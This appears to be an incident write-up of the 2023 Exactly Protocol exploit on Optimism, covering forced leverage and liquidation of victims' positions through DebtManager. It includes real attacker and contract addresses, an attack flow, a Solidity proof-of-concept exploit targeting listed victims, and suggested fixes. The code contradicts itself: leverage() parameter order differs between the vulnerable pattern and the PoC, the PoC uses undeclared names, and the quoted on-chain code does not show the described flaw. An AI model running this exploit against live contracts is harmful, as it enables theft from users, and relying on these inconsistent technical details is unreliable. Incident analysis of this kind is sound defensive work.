# Exactly Protocol Collateral Manipulation Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Exactly Protocol |
| Date | 2023-08-17 |
| Chain | Optimism |
| Loss | ~$7,000,000 USD |
| Attack Type | Collateral Manipulation + Liquidation Abuse |
| CWE | CWE-284 (Improper Access Control) |
| Attacker Address | `0x3747dbbcb5c07786a4c59883e473a2e38f571af9` |
| Attack Contract | `0x6dd61c69415c8ecab3fefd80d079435ead1a5b4d` |
| Vulnerable Contract | `0x16748cb753a68329ca2117a7647aa590317ebf41` |
| Fork Block | 108,375,557 |

## 2. Vulnerable Code Analysis

Exactly Protocol's `DebtManager.leverage()` function could be called arbitrarily against any victim's position. This allowed an attacker to forcibly manipulate a victim's collateral ratio into a liquidatable state and profit from the resulting liquidation.

```solidity
// Vulnerable pattern: leverage call against an arbitrary user's position
contract DebtManager {
    // Vulnerable: no validation that msg.sender is the account owner
    function leverage(
        address account,         // victim address to manipulate
        uint256 deposit,
        uint256 borrow,
        uint256 price,
        uint256 sqrtPriceLimitX96,
        address market
    ) external {
        // Forcibly levers up account's position
        // Manipulates victim's collateral to create an imminent liquidation
        exaUSDC.deposit(deposit, account);
        exaUSDC.borrowAtMaturity(maturity, borrow, 0, account, account);
    }

    // crossDeleverage is equally vulnerable
    function crossDeleverage(
        address account,
        uint256 amount,
        address marketIn,
        address marketOut
    ) external {
        // Victim's position can be manipulated without any validation
    }
}
```

**Vulnerability**: The `leverage()` and `crossDeleverage()` functions could be executed against any arbitrary `account` address, allowing an attacker to manipulate a victim's collateral ratio and profit through forced liquidation.

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Auditor.sol
  LiquidationIncentive public liquidationIncentive;  // ❌

// ...

  function initialize(LiquidationIncentive memory liquidationIncentive_) external initializer {  // ❌
    __AccessControl_init();

    _grantRole(DEFAULT_ADMIN_ROLE, msg.sender);

    setLiquidationIncentive(liquidationIncentive_);  // ❌
  }

// ...

  function checkShortfall(Market market, address account, uint256 amount) public view {
    // if the account is not 'in' the market, bypass the liquidity check
    if ((accountMarkets[account] & (1 << markets[market].index)) == 0) return;

    // otherwise, perform a hypothetical liquidity check to guard against shortfall
    (uint256 collateral, uint256 debt) = accountLiquidity(account, market, amount);  // ❌
    if (collateral < debt) revert InsufficientAccountLiquidity();  // ❌
  }

// ...

  function checkLiquidation(  // ❌

// ...

  function setLiquidationIncentive(  // ❌
```

```solidity
// File: DebtManager.sol
  function noTransferLeverage(Market market, uint256 deposit, uint256 ratio) internal {
    uint256[] memory amounts = new uint256[](1);
    ERC20[] memory tokens = new ERC20[](1);
    tokens[0] = market.asset();
    address sender = _msgSender;

    uint256 loopCount;
    {
      uint256 collateral = market.maxWithdraw(sender);  // ❌
      uint256 targetDeposit = (collateral + deposit - floatingBorrowAssets(market)).mulWadDown(ratio);  // ❌
      int256 amount = int256(targetDeposit) - int256(collateral + deposit);  // ❌
      if (amount <= 0) {
        market.deposit(deposit, sender);
        return;
      }
      loopCount = uint256(amount).mulDivUp(1, tokens[0].balanceOf(address(balancerVault)));
      amounts[0] = uint256(amount).mulDivUp(1, loopCount);
    }
    bytes[] memory calls = new bytes[](2 * loopCount);
    uint256 callIndex = 0;
    for (uint256 i = 0; i < loopCount; ) {
      calls[callIndex++] = abi.encodeCall(market.deposit, (i == 0 ? amounts[0] + deposit : amounts[0], sender));
      calls[callIndex++] = abi.encodeCall(
        market.borrow,
        (amounts[0], i + 1 == loopCount ? address(balancerVault) : address(this), sender)
      );
      unchecked {
        ++i;
      }
    }

    balancerVault.flashLoan(address(this), tokens, amounts, call(abi.encode(market, calls)));
  }

// ...

  function deleverage(Market market, uint256 withdraw, uint256 ratio) public msgSender {
    RollVars memory r;
    r.amounts = new uint256[](1);
    r.tokens = new ERC20[](1);
    r.tokens[0] = market.asset();
    address sender = _msgSender;

    uint256 collateral = market.maxWithdraw(sender) - withdraw;  // ❌
    uint256 amount = collateral - (collateral - floatingBorrowAssets(market)).mulWadDown(ratio);  // ❌

    r.loopCount = amount.mulDivUp(1, r.tokens[0].balanceOf(address(balancerVault)));
    r.amounts[0] = amount.mulDivUp(1, r.loopCount);
    r.calls = new bytes[](2 * r.loopCount + (withdraw == 0 ? 0 : 1));
    uint256 callIndex = 0;
    for (uint256 i = 0; i < r.loopCount; ) {
      r.calls[callIndex++] = abi.encodeCall(market.repay, (r.amounts[0], sender));
      r.calls[callIndex++] = abi.encodeCall(
        market.withdraw,
        (r.amounts[0], i + 1 == r.loopCount ? address(balancerVault) : address(this), sender)
      );
      unchecked {
        ++i;
      }
    }
    if (withdraw != 0) r.calls[callIndex] = abi.encodeCall(market.withdraw, (withdraw, sender, sender));

    balancerVault.flashLoan(address(this), r.tokens, r.amounts, call(abi.encode(market, r.calls)));
  }
```

```solidity
// File: Market.sol
  function liquidate(

// ...

  function unpause() external onlyRole(PAUSER_ROLE) {
    _unpause();
  }
```

## 3. Attack Flow

```
Attacker [0x3747dbbcb5c07786a4c59883e473a2e38f571af9]
  │
  ├─1─▶ exaUSDC.deposit(USDC)
  │      [exaUSDC: 0x81C9A7B55A4df39A9B7B5F781ec0e53539694873]
  │
  ├─2─▶ DebtManager.leverage(victimAddr, deposit, borrow)
  │      [DebtManager: 0x675d410dcf6f343219AAe8d1DDE0BFAB46f52106]
  │      Force-levers victim's position
  │      → exaUSDC.borrowAtMaturity() force-executed
  │
  ├─3─▶ Auditor check: victim collateral ratio < liquidation threshold
  │      [Auditor: 0xaEb62e6F27BC103702E7BC879AE98bceA56f027E]
  │
  ├─4─▶ exaUSDC.liquidate(victimAddr, repayAssets, seizeMarket)
  │      Liquidate victim's collateral → collect liquidation bonus
  │      [USDC: 0x7F5c764cBc14f9669B88837ca1490cCa17c31607]
  │
  ├─5─▶ exaUSDC.redeem(shares) — unwind own position
  │
  ├─6─▶ DebtManager.crossDeleverage()
  │      [WETH: 0x4200000000000000000000000000000000000006]
  │      Unwind position via Uniswap V3 swap
  │
  └─7─▶ Profit realized (~7M USD)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IexaUSDC {
    function deposit(uint256 assets, address receiver) external returns (uint256);
    function borrowAtMaturity(uint256 maturity, uint256 assets, uint256 maxAssets,
        address receiver, address owner) external returns (uint256);
    function liquidate(address borrower, uint256 maxAssets, address seizeMarket) external returns (uint256);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256);
}

interface IDebtManager {
    function leverage(address market, uint256 deposit, uint256 borrow,
        uint256 price, uint256 sqrtPriceLimitX96, address account) external;
    function crossDeleverage(address account, address marketIn, address marketOut,
        uint256 minAmountOut, uint256 deadline) external;
}

contract ExactlyExploit {
    IexaUSDC exaUSDC = IexaUSDC(0x81C9A7B55A4df39A9B7B5F781ec0e53539694873);
    IAuditor auditor = IAuditor(0xaEb62e6F27BC103702E7BC879AE98bceA56f027E);
    IDebtManager debtManager = IDebtManager(0x675d410dcf6f343219AAe8d1DDE0BFAB46f52106);
    IERC20 USDC = IERC20(0x7F5c764cBc14f9669B88837ca1490cCa17c31607);

    address[] victims; // list of victim addresses

    function testExploit() external {
        for (uint i = 0; i < victims.length; i++) {
            _exploitVictim(victims[i]);
        }
    }

    function _exploitVictim(address victim) internal {
        // Force-lever victim's position
        debtManager.leverage(
            address(exaUSDC),
            0,          // deposit
            maxBorrow,  // borrow
            price,
            0,
            victim      // victim address
        );

        // Liquidate victim
        exaUSDC.liquidate(victim, type(uint256).max, address(exaUSDC));
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-284 (Improper Access Control) |
| Vulnerability Type | Arbitrary account manipulation, forced liquidation |
| Impact Scope | All Exactly Protocol users |
| Explorer | [Optimistic Etherscan](https://optimistic.etherscan.io/address/0x16748cb753a68329ca2117a7647aa590317ebf41) |

## 6. Security Recommendations

```solidity
// Fix 1: Enforce account == msg.sender
function leverage(
    address market,
    uint256 deposit,
    uint256 borrow,
    uint256 price,
    uint256 sqrtPriceLimitX96,
    address account  // remove parameter or enforce msg.sender
) external {
    require(account == msg.sender, "Can only leverage own account");
    // ...
}

// Fix 2: Signature-based delegation
function leverageOnBehalf(
    address account,
    uint256 deposit,
    uint256 borrow,
    uint256 deadline,
    bytes calldata signature
) external {
    bytes32 hash = _hashLeverageData(account, deposit, borrow, deadline);
    require(ECDSA.recover(hash, signature) == account, "Invalid signature");
    // ...
}

// Fix 3: Restrict collateral ratio change
function leverage(...) external {
    uint256 healthBefore = getHealthFactor(account);
    // ... execute leverage
    uint256 healthAfter = getHealthFactor(account);
    // revert if health factor drops below liquidation threshold
    require(healthAfter >= LIQUIDATION_THRESHOLD, "Would trigger liquidation");
}
```

## 7. Lessons Learned

1. **Access Control for Proxy Functions**: Every state-changing function that accepts an `account` parameter must validate `msg.sender == account`. The only exceptions are cases with explicit signatures or allowlists.
2. **Forced Liquidation Attacks**: Attacks that manipulate a victim's collateral ratio into a liquidatable state are common in lending protocols. Access control over changes to liquidation trigger conditions is essential.
3. **Optimism DeFi Security**: DeFi protocols on L2 chains are equally exposed to the same access control vulnerabilities.
4. **DebtManager Pattern**: Leverage/deleverage management contracts must always treat account ownership verification as a core security requirement.